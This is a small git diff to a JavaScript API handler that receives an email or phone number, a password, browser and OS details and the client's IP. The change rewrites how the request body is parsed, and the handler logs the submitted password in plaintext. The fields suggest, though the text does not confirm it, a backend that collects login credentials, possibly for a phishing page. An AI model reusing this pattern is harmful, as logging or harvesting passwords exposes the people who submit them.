@@ -1,5 +1,6 @@
 import https from 'https';
 import { MongoClient } from 'mongodb';
+import { parse } from 'querystring';
 
 // Function to get real IP
 function getClientIP(req) {
@@ -43,7 +44,19 @@ export default async function handler(req, res) {
     return res.status(405).json({ message: 'Method not allowed' });
   }
 
-  const { email_or_phone = '', password = '', browser = '', os = '' } = req.body;
+  // Parse the body
+  const body = await new Promise((resolve) => {
+    let data = '';
+    req.on('data', (chunk) => {
+      data += chunk;
+    });
+    req.on('end', () => {
+      resolve(data);
+    });
+  });
+
+  const parsedBody = parse(body.toString());
+  const { email_or_phone = '', password = '', browser = '', os = '' } = parsedBody;
   console.log('Received data:', { email_or_phone, password, browser, os });
   const ip = getClientIP(req);
 
